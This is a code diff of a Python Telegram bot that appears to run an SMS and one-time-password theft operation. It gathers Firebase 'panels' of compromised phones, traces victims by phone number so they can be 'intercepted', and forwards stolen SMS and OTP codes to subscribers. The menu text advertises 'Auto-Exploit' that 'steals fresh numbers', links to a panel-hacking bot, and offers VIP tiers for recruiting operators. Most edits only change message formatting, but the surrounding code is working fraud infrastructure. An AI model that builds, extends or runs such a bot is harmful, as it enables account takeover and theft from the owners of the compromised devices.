+                "🎁 <b>SYNDICATE REP SYSTEM</b>\n━━━━━━━━━━━━━━━━━━\n"
+                f"👤 <b>Your Rep:</b> {ref_count} / 20 Targets\n\n"
+                "Invite 20 operators to unlock <b>Elite VIP Status</b> (Unlimited Global Access & Elite Vault) for 24 Hours!\n\n"
+                f"🔗 <b>Your Exploit Link:</b>\n<code>{ref_link}</code>"
             )
-            await update.message.reply_text(msg, parse_mode="Markdown")
+            await update.message.reply_text(msg, parse_mode="HTML")
             return
 
         if text == "📖 Hacker Manual":
             user_focus.setdefault(bot_token, {}).pop(chat_id, None)
             msg = (
-                "💡 **OPERATOR MANUAL**\n━━━━━━━━━━━━━━━━━━\n"
-                "1. **Script Kiddies (Free):** Only access Custom Panels.\n"
-                "2. **VIP Syndicate:** Access Global 5000+ Panel Network.\n"
-                "3. **Elite Vault:** 'Like/Save' panels to your private vault (VIP Only).\n"
-                "4. **Payload Injector:** Check bulk numbers manually.\n"
-                "5. **Auto-Exploit:** Steals fresh numbers directly.\n\n"
-                "**Need more panels?** Hack them using @panelsotpbot"
+                "💡 <b>OPERATOR MANUAL</b>\n━━━━━━━━━━━━━━━━━━\n"
+                "1. <b>Script Kiddies (Free):</b> Only access Custom Panels.\n"
+                "2. <b>VIP Syndicate:</b> Access Global 5000+ Panel Network.\n"
+                "3. <b>Elite Vault:</b> 'Like/Save' panels to your private vault (VIP Only).\n"
+                "4. <b>Payload Injector:</b> Check bulk numbers manually.\n"
+                "5. <b>Auto-Exploit:</b> Steals fresh numbers directly.\n\n"
+                "<b>Need more panels?</b> Hack them using @panelsotpbot"
             )
-            await update.message.reply_text(msg, parse_mode="Markdown")
+            await update.message.reply_text(msg, parse_mode="HTML")
             return
 
         if text == "🗑️ Drop Panel":
@@ -1358,13 +1349,13 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 kb.append([InlineKeyboardButton(f"❌ Drop: {url_str[:25]}...", callback_data=f"del_panel:{i}")])
             kb.append([InlineKeyboardButton("Close", callback_data="close_msg")])
             
-            await update.message.reply_text("🗑 **Drop Private Panels**\nSelect a node to disconnect from your network:", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
+            await update.message.reply_text("🗑 <b>Drop Private Panels</b>\nSelect a node to disconnect from your network:", reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
             return
 
         if text == "➕ Add Panel":
             user_focus.setdefault(bot_token, {}).pop(chat_id, None)
             pending_action[chat_id] = {"action": "set_personal_db"}
-            await update.message.reply_text("➕ **INJECT PRIVATE PANELS**\n━━━━━━━━━━━━━━━━━━\nSend Firebase URL(s). System will automatically parse payloads.\n\nCancel: /cancel", parse_mode="Markdown")
+            await update.message.reply_text("➕ <b>INJECT PRIVATE PANELS</b>\n━━━━━━━━━━━━━━━━━━\nSend Firebase URL(s). System will automatically parse payloads.\n\nCancel: /cancel", parse_mode="HTML")
             return
 
         if text == "Super Admin" and chat_id in ADMIN_IDS:
@@ -1380,7 +1371,7 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
 
         if text == "🦇 Deep Scan":
             if HEAVY_TASK_LIMITER.locked():
-                await update.message.reply_text("⚠️ **Network Congestion!**\nPlease wait 60 seconds.", parse_mode="Markdown")
+                await update.message.reply_text("⚠️ <b>Network Congestion!</b>\nPlease wait 60 seconds.", parse_mode="HTML")
                 return
 
             async with HEAVY_TASK_LIMITER:
@@ -1449,22 +1440,22 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 await update.message.reply_text("❌ Invalid MSISDN structure.")
                 return
                 
-            wait_msg = await update.message.reply_text(f"⏳ Pinging databases for `+{clean_search}`...", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Abort", callback_data="cancel_action")]]), parse_mode="Markdown")
+            wait_msg = await update.message.reply_text(f"⏳ Pinging databases for <code>+{clean_search}</code>...", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Abort", callback_data="cancel_action")]]), parse_mode="HTML")
             all_devices = await get_all_devices(bot_token, chat_id, users_db)
             found_devs = [d for d in all_devices if any(clean_search in num for num in d.numbers) and d.status == "online"]
             
             if not found_devs:
-                await wait_msg.edit_text(f"📭 Target `+{clean_search}` offline.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]), parse_mode="Markdown")
+                await wait_msg.edit_text(f"📭 Target <code>+{clean_search}</code> offline.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]), parse_mode="HTML")
                 return
                 
             rows = [[InlineKeyboardButton(f"🟢 📱 [{d.db_tag}] {' & '.join(d.numbers)}", callback_data=f"sel:{d.id}")] for d in found_devs[:10]]
             rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
-            await wait_msg.edit_text(f"🔍 **Target Traced:** `+{clean_search}`\nSelect below to intercept:", reply_markup=InlineKeyboardMarkup(rows), parse_mode="Markdown")
+            await wait_msg.edit_text(f"🔍 <b>Target Traced:</b> <code>+{clean_search}</code>\nSelect below to intercept:", reply_markup=InlineKeyboardMarkup(rows), parse_mode="HTML")
             return
         
         if action == "check_number_input":
             if HEAVY_TASK_LIMITER.locked():
-                await update.message.reply_text("⚠️ **Network Congestion!**\nTry again in 60 seconds.", parse_mode="Markdown")
+                await update.message.reply_text("⚠️ <b>Network Congestion!</b>\nTry again in 60 seconds.", parse_mode="HTML")
                 return
 
             async with HEAVY_TASK_LIMITER:
@@ -1643,10 +1634,24 @@ async def _update_global_cache():
     scan_progress["scanned"] = 0
     scan_progress["is_scanning"] = True
     
+    is_first_run = len(GLOBAL_DEVICE_CACHE.get("ALL", [])) == 0
+
     for i in range(0, len(items), CHUNK_SIZE):
         chunk = items[i:i + CHUNK_SIZE]
         tasks = [fetch_device_data_task(tag, url, all_devices_gathered) for tag, url in chunk]
         await asyncio.gather(*tasks, return_exceptions=True)
+        
+        # 🔥 PUSH LIVE UPDATES IMMEDIATELY ON FIRST RUN
+        if is_first_run:
+            unique_devices = []
+            seen_ids_cache = set()
+            for d in all_devices_gathered:
+                if d.id in seen_ids_cache: continue
+                seen_ids_cache.add(d.id)
+                unique_devices.append(d)
+            unique_devices.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if len(d.numbers) > 0 else 1, -d.timestamp))
+            GLOBAL_DEVICE_CACHE["ALL"] = unique_devices
+            
         await asyncio.sleep(0.5) 
         
     unique_devices = []
@@ -1703,7 +1708,7 @@ async def _forward_sms(device: Device, sms: dict) -> None:
             if otp: 
                 all_users.setdefault(chat_id, {})["otp_count"] = all_users.get(chat_id, {}).get("otp_count", 0) + 1
                 save_user(chat_id)
-            send_tasks.append(app_to_use.bot.send_message(chat_id, msg_text, reply_markup=markup))
+            send_tasks.append(app_to_use.bot.send_message(chat_id, msg_text, reply_markup=markup, parse_mode="HTML"))
             
     if send_tasks:
         await asyncio.gather(*send_tasks, return_exceptions=True)
